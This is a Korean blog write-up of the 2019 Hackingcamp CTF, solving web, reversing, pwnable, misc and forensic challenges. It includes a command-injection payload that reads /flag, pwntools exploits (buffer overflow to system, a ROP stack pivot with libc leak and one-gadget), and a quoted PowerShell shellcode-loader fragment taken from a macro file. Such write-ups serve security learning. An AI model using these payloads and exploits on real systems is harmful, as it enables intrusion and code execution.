---
title: "2019 20th Hackingcamp CTF Writeup"
date: 2019-8-31
tags: [Hackingcamp]
categories: [CTF]
---

# Web Hacking

## js

jsfuck으로 되어있는데 jsfuck만 긁어서decrypt 해주면 된다.

```javascript
function anonymous(
) {
['HCAMP{0jSeasy0}',''][0x1];
}
```

**FLAG : `HCAMP{0jSeasy0}`**

<br />

## command injection

$ nslookup " " 이렇게 주는데 " "사이에 커맨드 인젝션 해주면 된다. 이 사이에 `` 넣어주고 그 사이에 /cat flag 넣어주면 된다.

```
$ nslookup "`cat /flag`"
Server:		127.0.0.11
Address:	127.0.0.11#53

** server can't find HCAMP{camsfsodfasjfai}: NXDOMAIN
```

**FLAG : `HCAMP{camsfsodfasjfai}`**

<br />

# Reversing

## Eeeeasy Reversing

flag.enc 파일이 주어진다. flag.txt에서 값을 긁어와서 어떠한 연산을 거쳐서  마지막에 enc 파일에 써준다.

```c
__int64 sub_402D30()
{
  __time64_t v0; // rax
  FILE *v1; // rbx
  FILE *v2; // r13
  size_t v3; // r12
  char *v4; // rbp
  char *v5; // rbx
  char v6; // si

  sub_401610();
  v0 = time64(0i64);
  srand(v0 >> 15);
  v1 = fopen("flag.txt", "rb");
  v2 = fopen("flag.enc", "wb");
  fseek(v1, 0, 2);
  v3 = (unsigned int)ftell(v1);
  v4 = (char *)calloc(v3, 1ui64);
  fseek(v1, 0, 0);
  fread(v4, 1ui64, v3, v1);
  fclose(v1);
  if ( (_DWORD)v3 )
  {
    v5 = v4;
    do
    {
      *v5 += rand();
      v6 = rand();
      *v5 ^= rand() ^ v6;
      ++v5;
    }
    while ( v5 != &v4[(unsigned int)(v3 - 1) + 1] );
  }
  fwrite(v4, 1ui64, v3, v2);
  return 0i64;
}
```

srand는 enc 파일이 인코딩된 시간을 구해서 15만큼 쉬프트 연산해주면 된다. 그리고 srand값만 구하면 역연산 해주면 된다. 음수가 나오는 것들도 있어서 예외처리로 바꿔주었다.

```python
from ctypes import *

table = [244, 206, 31, 39, 232, 186, 217, 217, 59, 43, 27, 168, 120, 116, 106, 47, 118, 66, 139, 22, 48, 48, 91, 174, 203, 243, 9, 64, 64, 23, 205, 22, 124, 227, 112, 188, 169, 184, 245, 47, 58, 208, 228, 176]

lib = CDLL('msvcrt')
lib.srand(47799)
flag=''

for i in range(len(table)):
	rand1=lib.rand()&0xff
	rand2=lib.rand()&0xff
	rand3=lib.rand()&0xff
	try:
		flag+=chr((table[i]^rand3^rand2)-rand1)
	except:
		flag += chr(255+(table[i]^rand3^rand2)-rand1 +1)
		pass
print(flag)
```

**FLAG : `HCAMP{Supper_Zzang_Zzang_Easy_Rever$ing!!@@}`**

<br />

## Split Split Split

파일이 여러개로 나뉘어져있다. 이 파일들을 순서대로 다 합치면 Mach-O 64-bit executable x86_64 파일이 나온다.

```python
import binascii

bin = ""
for i in range(5):
	f = open('00'+str(i)+'.bin','rb')
	data = f.read()
	f.close()
	bin += binascii.hexlify(data)
bin = binascii.unhexlify(bin)
f = open('split_file','wb')
f.write(bin)
f.close()
```

이제 이 Mach-O 바이너리를 열어보면 아래와 같은 코드가 있다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // [rsp+18h] [rbp-78h]
  char v5[104]; // [rsp+20h] [rbp-70h]
  __int64 v6; // [rsp+88h] [rbp-8h]

  memcpy(v5, "XSQ]@kC@\\YDOTQDQOCESSUCCm", 0x64uLL);
  v4 = 0;
  puts("Let's go Decrypt!");
  while ( v4 < strlen(v5) )
  {
    v5[v4] ^= 0x10u;
    ++v4;
  }
  result = printf("\n", "XSQ]@kC@\\YDOTQDQOCESSUCCm");
  if ( __stack_chk_guard == v6 )
    result = 0;
  return result;
}
```

이런식으로 돼있는데 그냥 역연산 해주면 풀린다.

```python
enc = "XSQ]@kC@\\YDOTQDQOCESSUCCm"
print bytearray(i^0x10 for i in bytearray(enc))
```

**FLAG : `HCAMP{SPLIT_DATA_SUCCESS}`**

<br />

## M0000V

아마도 `movfuscator` 로 컴파일된 바이너리 같다. 근데 demovfuscator를 사용하려고 했는데 capstone이 자꾸 오류나서 그냥 브루트포스 돌리고 게싱해서 풀었다. 

근데 다른 분이 stace를 이용해서 풀었길래 똑같이 풀어보았다. 

```sh
for i in a b c d e f g h i j k l m o p q r s t u v w x y j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 @ ! ; do echo -n $i\ ; echo 'HCAMP{'$i | strace ./movisfun 2>&1 | grep SIG  | wc -l;done
```

이런식으로 스크립트를 실행시키면 표준출력해주고 strace로 시스템콜 가져와서 HCAMP{ 뒤에 올 문자를 보여준다. 그러면 일일이 하나씩 대입해 시스템콜을 추적하면 알맞은 플래그를 찾을 수 있다.

**FLAG : `HCAMP{M000oo00v_1s_1nterestin9}`**

<br />

## SimpleREV

메인을 보면 어떠한 함수에 인자 값들을 넣고 그 함수의 리턴값에 따라 Correct!를 출력해준다.

```c
int sub_402000()
{
  dword_404384 = 255;
  dword_404380 = 1;
  puts("Welcome HACKING CAMP");
  puts("THIS IS REAL PROTECTOR");
  puts("But, when you more think you will solve it");
  puts("Welcome HACKING CAMP");
  puts("=========Access only Admin===========");
  dword_404388 = 30;
  if ( (unsigned __int8)sub_405000(dword_40437C, dword_404380, dword_404384, 30) )
    puts("Correct!");
  return 0;
}
```

```c
char __usercall sub_405000@<al>(char a1@<dil>, int a2, int a3, int a4, int a5)
{
  unsigned int v5; // eax
  int v6; // esi
  unsigned int v7; // edx
  int v8; // eax
  char v10; // [esp-4h] [ebp-3Ch]
  int v11; // [esp+Ch] [ebp-2Ch]
  int v12; // [esp+10h] [ebp-28h]
  __int128 v13; // [esp+14h] [ebp-24h]
  __int64 v14; // [esp+24h] [ebp-14h]
  int v15; // [esp+2Ch] [ebp-Ch]
  __int16 v16; // [esp+30h] [ebp-8h]
  char v17; // [esp+32h] [ebp-6h]
  int retaddr; // [esp+3Ch] [ebp+4h]

  v12 = 0;
  v13 = 0i64;
  v15 = 0;
  v14 = 0i64;
  v16 = 0;
  v17 = 0;
  sub_401020(">> ", a1);
  sub_401050("%d", (unsigned int)&v12);
  v5 = time64(0);
  srand(v5);
  retaddr = rand();
  if ( v12 == 78 && a4 == 1 )
  {
    v6 = 0;
    sub_401020(">> ", v10);
    sub_401050("%s", &v13);
    if ( a5 != 30 )
      system(Command);
    v7 = 0;
    if ( (char *)&v13 + strlen((const char *)&v13) + 1 == (char *)&v13 + 1 )
      goto LABEL_13;
    do
    {
      v8 = byte_4031C9[2 * v7] + byte_4031C8[2 * v7];
      if ( v8 < 0 )
        v8 = -v8;
      *((_BYTE *)&v13 + v7) ^= v8;
      if ( *((_BYTE *)&v13 + v7) != byte_403248[v7] )
        goto LABEL_13;
      v11 = v6 + 1;
      ++v7;
      ++v6;
    }
    while ( v7 < strlen((const char *)&v13) );
    if ( v11 != 30 )
LABEL_13:
      exit(0);
    puts("C0ngratulation");
  }
  return 1;
}
```

먼저 바이너리 패치로 >> 2번 째 입력 받는 곳까지 갈 수 있게 하고 이후 동적디버깅해서 비교해주는 값을 가져왔다. 

이게 값이 좀 신기하게 들어가서 0xffffffff 넘게 들어가는 것도 있는데 그냥 비교해주는 구문앞에서 그 값과 테이블 값을 xor하면 플래그가 나온다. 

```python
check = ['0x58', '0x38', '0x79', '0x54', '0xf4', '0x6a', '0x7d', '0x58', '0xb2', '0x30', '0x21', '0x6d', '0x7d', '0x49', '0xc', '0xff', '0x1f', '0x71', '0x2', '0x1a', '0x41', '0x6c', '0x35', '0xe0', '0x49', '0xa7', '0x46', '0x7b', '0x5', '0x4f']
table = [25,80,38,11,141,90,8,7,211,84,76,4,19,22,120,151,126,31,105,105,30,92,5,191,43,151,53,8,93,11]
print ''.join(chr(int(x,16)^y) for x,y in zip(check,table))
```

**FLAG : `HCAMP{Ah__y0u_admin_thanks_00_b0ssXD}`**

<br />

# Pwnable

## magic

플래그가 저장된 값과 입력한 값을 비교하는데 Brute force attack 돌려주면 된다.

```python
from pwn import *

payload = ''

while len(payload) != 30:
	for i in range(33,127):
		p = remote('pwnable.shop',20204)
		p.sendlineafter('>> ',str(2))
		tmp = chr(i)
		go = payload
		go += tmp
		p.sendlineafter('>> ',go)
		print go
		sleep(0.1)
		m = p.recvline()
		if 'Good!' in m:
			payload += tmp
			break
		p.close()
p.interactive()
```

**FLAG : `HCAMP{4RE_Y0U_GUESS1NG_K1NG?}`**

<br />

## bofforeverfluw

```python
from pwn import * 

#context.log_level = 'debug'

p = remote('pwnable.shop',20201)
e = ELF('./bofforeverfluw_edeb9811b02cc3c5f4f7cfecf5eebcdf')

system = 0x80484d2
ret = 0x0804A024
payload = 'A'*(0x204 + 0x4)
payload += p32(system)
payload += p32(ret)
p.sendafter('hi\n',payload)
sleep(0.1)
p.interactive()
```

**FLAG : `HCAMP{0ver_0ver_0ver_flow_@3@_!!}`**

<br />

## pivot

Stack pivoting

```python
from pwn import *

context.arch = 'amd64'
# context.log_level = 'debug'
e = ELF('./pivot')
p = process('./pivot')
libc = e.libc
leave_ret = 0x000000000040075f # leave ; ret
prdi = 0x00000000004007d3 # pop rdi ; ret
prbp = 0x0000000000400620 # pop rbp ; ret
prsi_r15 = 0x00000000004007d1 # pop rsi ; pop r15 ; ret
bss = e.bss() + 0x100
main = 0x000000000040072E

payload = 'A'*0x50
payload += p64(bss) # sfp
payload += p64(main) # ret
p.send(payload)

payload2 = p64(prdi) + p64(1) + p64(prsi_r15) + p64(e.got['write']) + p64(0) + p64(e.plt['write'])
payload2 += p64(e.symbols['main'])
payload2 = payload2.ljust(0x50,'A')
payload2 += p64(bss - 0x50 - 8) # sfp
payload2 += p64(leave_ret) # ret
p.send(payload2)

libc_base = u64(p.recvuntil('\x7f')[-6:] + '\x00\x00') - libc.symbols['write']
log.info('libc_base : ' + hex(libc_base))

payload3 = 'A'*0x58
payload3 += p64(libc_base + 0x45216)
p.send(payload3)

p.interactive()
```

<br />

## campnote

fastbin

<br />

# Misc

## I_AM_NEWBIE

문제가 나오는데 그 질문에 대한 답을 계속 넣어주면 된다. 

```python
from pwn import *

#context.log_level = 'debug'

p = remote('pwnable.shop',20207)
print p.sendlineafter('>>','stack')
sleep(0.1)
print p.sendlineafter('>>','user account control')
sleep(0.1)
print p.sendlineafter('>>','eip')
sleep(0.1)
print p.sendlineafter('>>','assembly')
sleep(0.1)
print p.sendlineafter('>>','http')
sleep(0.1)
print p.sendlineafter('>>','eax')
sleep(0.1)
print p.sendlineafter('>>','ntfs')
sleep(0.1)
print p.sendlineafter('>>','cookie')
sleep(0.1)
print p.sendlineafter('>>','mbr')
sleep(0.1)
print p.sendlineafter('>>','security cookie')
sleep(0.1)
print p.sendlineafter('>>','breakpoint')
sleep(0.1)
print p.sendlineafter('>>','PK')
sleep(0.1)
print p.sendlineafter('>>','backdoor')
p.interactive()
```

**FLAG : `HCAMP{You_able_to_zzzzzannng_h4cker}`**

<br />

## 01010101

o를 0으로 바꿔주고 O을 1로 바꿔주고 8비트씩 끊어서 넣어줬다.

```python
a="oOooOooooOooooOOoOoooooOoOooOOoOoOoOoooooOOOOoOOoOooooOoooOOooOOooOOooOOoOOOoooooOoOOOOOoOooooOoooOOooOOooOOooOOoOOOoooooOoOOOOOoOoooooOoOOOooOOoOOoooOOooOOoooOooOOoooOoOoOOOOOoOooooOOooOOoooooOOooOooooOOooOOoOoOOOOOoOoooooooOOOoOOOoOoooooooOOOOOoO"
flag=""
for i in range(0,len(a),8):
	tmp = a[i:i+8]
	tmp = tmp.replace('o','0').replace('O','1')
	flag += tmp
print ''.join(map(lambda x: chr(int(x, 2)), [flag[i:i+8] for i in xrange(0, len(flag),8)]))
```

**FLAG : `HCAMP{B33p_B33p_Asc11_C0d3_@w@}`**

<br />

## ControlFlowGraph

그래프뷰보면 플래그가 나온다.

![](https://user-images.githubusercontent.com/32904385/64025112-f516c380-cb76-11e9-8fc0-9ee8d8eb92dd.png)

**FLAG : `HCAMP{Fun_CFG_@@}`**

<br />

# Forensic

## Party of Base64

HackingCamp20th.docm 파일을 준다. 

확장자를 zip으로 바꾸고 속에 있는 내부 파일들을 보게되면 `vbaProject.bin` 이라는 파일이 존재했는데 헥스값으로 까보면 base64 인코딩된 부분이 존재했다. 이 부분만 가져와서 base64 decode해주면 아래와 같은 소스가 나온다.

```php
nd $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String('MUY4QjA4MDgxQTMyNTI1RDAwMDM0ODQzNDE0RDUwNUY2NTZFNjM2RjY0NjU2NDJFNzQ3ODc0MDA2RDUxQzE0RUMzMzAwQ0RENjFEMkJFQTNBMkREMEU2MDAyMDJBNjk2QUQ4QzBCMjdEMEI0MDkwOTA5MjFEMERBNjYyOEE1NTFCNjAzMUQwQkE4RTkzRjcxRTA4M0Y4MTJFQzY0ODM4MjY4NkEyNTdFN0U4RUZEOUNDRjhGRjc3RDlFQTk2NDlEMEIzODM0M0FFN0U5Q0VGQ0E4RDVGOTg1MjU3Q0YxMDc3Q0U1NTk5RUJFMUE4QkQyNTI3MzU5NDMyRUI1QkMxOTg1ODMwOTFDMDA5Qjk2ODM2MjVBODZDNzY4QjQ5RjRDQ0JFODBDNkQ4ODE2QTIzRkMwMUQ2M0E3ODg5RDJBMTcwQjE3MEUwQjg1Q0I4OTIyRTc0N0IxMzNFMjBFMjgzRjc3QkVFNUU3OEUxRjFEQjNGRUI2OEYxRTE4QTE2RkU1MjIxMTgxREZFQUFDNUE5RDM2RkU0NTVBNDNDMDMzMEQxQzlCOEJGQkI4MURDMkU4MDRGMEQwRUQyMkFCNERCNEI2MTVDMDI3NzA4RDk0NzIzNEVFMzdCMTVEQzIyRUVENDdGODkyQUFCNTZCQTFENzc1NjY4NTIzNjgzMUFBMzE5RTBCRjUxOEE4MzQzMzFBRUM2NDdBQzRGMEUwMkYzMkYyODg1REE2RjU5RDRDMzZBRERBQTBBMjdDNTE2RjY3QjkwMjE2MzM1ODUyRDk5OTk4QTlFQTM5RDgxMDNDNzBGNzFBRkUyMkQyMjIyMEM3RUYwRTdEMjIxQTVEMkJBOTdGODg2Q0M1RkVDNTZEMUJGRjY3MkM1RDQ2QjVENjY2OEI1QTYwMjMzQTZFMkE5RTQ5OUVEOUYxQ0FGQTQ5NzlFMDlFMDFDRjZGMzc5MzhEMzAwQTA2QkRBMkYyMUI3M0U5NzlDRDg5RDAzMDZDODFBMjQyRDE3Njg2RTQzNUU4NTAyNEYyMDk2M0NEMkJGQzlGQzcyNjM2MkYyMEQ4MkJBQUUwMTc4NTVEOENBRkNFRUY5OTQ3RTkxRTBDNjNGRkZCQzVBRDM4RjZCMDU2NEExOEUzRjRBMkE2RTUxN0UxRDY4RTE3MTUwMzAwMDA=')

for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 13
}
```

그리고 저기 var_code라는 변수를 base64 디코딩하면 16진수 값들이 나오는데 이 16진수를 보면 gzip이라는 것을 알 수 있다.

![](https://user-images.githubusercontent.com/32904385/63994577-0092cc00-cb30-11e9-98a7-f3392888b346.png)

이 gzip을 압축 해제하면 `HCAMP_encoded.txt` 이라는 텍스트 파일이 나온다. 그 안에 있는 값을 16진수를 xor 13 해줬다.

```python
b="E2B6B22E 64636E61 7869682D 317E7969 64622365 3300072E 64636E61 7869682D 317E7969 61646F23 65330007 2E64636E 61786968 2D317A64 6369627A 7E236533 00070007 00076E65 6C7F2D69 6C796C56 3F383B50 2D302D2F 51753B6B 51753834 5175386B 51753835 5175393E 5175393C 51753938 5175383B 51753934 51753A3E 51753A6E 5175393E 5175386F 51753934 51753868 5175386B 51753939 51753934 5175393D 5175393D 51753A3E 51753B3C 51753969 5175393D 5175386F 51753969 51753868 51753934 2F360007 00076E65 6C7F272D 7E687959 6C6F6168 25240007 76000704 0007046B 627F2D25 6463792D 642D302D 3D362D64 2D312D3F 352D362D 64262624 00070476 00070404 696C796C 5664502D 53302D3D 753F4E36 00070404 696C796C 5664502D 2B302D3D 754B4B4B 4B4B4B36 00070470 00070007 047F6879 787F632D 696C796C 36000770 00070007 6463792D 4E65686E 66256E62 637E792D 6E656C7F 2D27696C 796C212D 6E62637E 792D6E65 6C7F2D27 696C796C 3F216463 792D7562 7F5B6C61 24000776 0007046E 656C7F2D 6E65686E 66687F56 3F383B50 2D302D76 2D2F3D2F 2D703600 07046068 606E7D74 256E6568 6E66687F 212D696C 796C212D 7E647768 626B2569 6C796C24 263C2436 0007047E 797F6E6C 79256E65 686E6668 7F212D2F 762F2436 0007047E 797F6E6C 79256E65 686E6668 7F212D69 6C796C3F 24360007 047E797F 6E6C7925 6E65686E 66687F21 2D2F702F 24360007 047D7879 7E256E65 686E6668 7F243600 07047F68 79787F63 2D3D3600 07700007 00076463 792D606C 64632564 63792D6C 7F6A6E21 2D6E656C 7F272D6C 7F6A7B56 50240007 76000704 6463792D 25276B7D 24256E62 637E792D 6E656C7F 27216E62 637E792D 6E656C7F 2D272164 63792436 0007046B 7D2D302D 4E65686E 66360007 046E6263 7E792D6E 656C7F27 2D6B616C 6A2D302D 256E6263 7E792D6E 656C7F27 247E6879 596C6F61 68252436 00070464 6B2D252C 6B7D2525 6E62637E 792D6E65 6C7F2724 2F454E4C 405D2F21 6B616C6A 212D3C3D 24240007 04760007 04047D78 797E252F 5E786E6E 687E7E2F 24360007 04700007 70"
b=b.replace(" ","")
go=""
for i in range(0,len(b),2):
	go += chr(int("0x" + b[i:i+2],16) ^ 13)
print go
```

이렇게 xor해주면 c언어 코드가 나오게 된다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>


char data[256] = "\x6f\x59\x5f\x58\x43\x41\x45\x56\x49\x73\x7c\x43\x5b\x49\x5e\x5f\x44\x49\x40\x40\x73\x61\x4d\x40\x5b\x4d\x5e\x49";

char* setTable()
{
	
	for (int i = 0; i < 28 ; i++)
	{
		data[i] ^= 0x2C;
		data[i] &= 0xFFFFFF;
	}

	return data;
}

int Check(const char *data, const char *data2,int xorVal)
{
	char checker[256] = { "0" };
	memcpy(checker, data, sizeof(data)+1);
	strcat(checker, "{");
	strcat(checker, data2);
	strcat(checker, "}");
	puts(checker);
	return 0;
}

int main(int argc, char* argv[])
{
	int (*fp)(const char*,const char *,int);
	fp = Check;
	const char* flag = (const char*)setTable();
	if (!fp((const char*)"HCAMP",flag, 10))
	{
		puts("Success");
	}
}
```

이제 테이블 값과 0x2c랑 xor해주면 된다..

```python
d = "\x6f\x59\x5f\x58\x43\x41\x45\x56\x49\x73\x7c\x43\x5b\x49\x5e\x5f\x44\x49\x40\x40\x73\x61\x4d\x40\x5b\x4d\x5e\x49"

print ''.join(chr((ord(d[i])^0x2c) & 0xffffff) for i in range(len(d)))
```

**FLAG : `HCAMP{Customize_Powershell_Malware}`**

<br />

## Welcome to hackingcamp

jpg 파일이 주어지는데 jpg 파일 안에 png 파일이 숨겨져 있었다. 그 png 파일을 열어보면 플래그가 있다.

**FLAG : `HCAMP{@3@_Welcome_t0_hacking_c4mp_!!}`**

<br />

## Lorem Lock

HwpScan2를 이용해서 풀었다. Section0에 Text를 보니 플래그가 있었다.

**FLAG : `HCAMP{Oh!__Y0u_Know_##_OFFSET}`**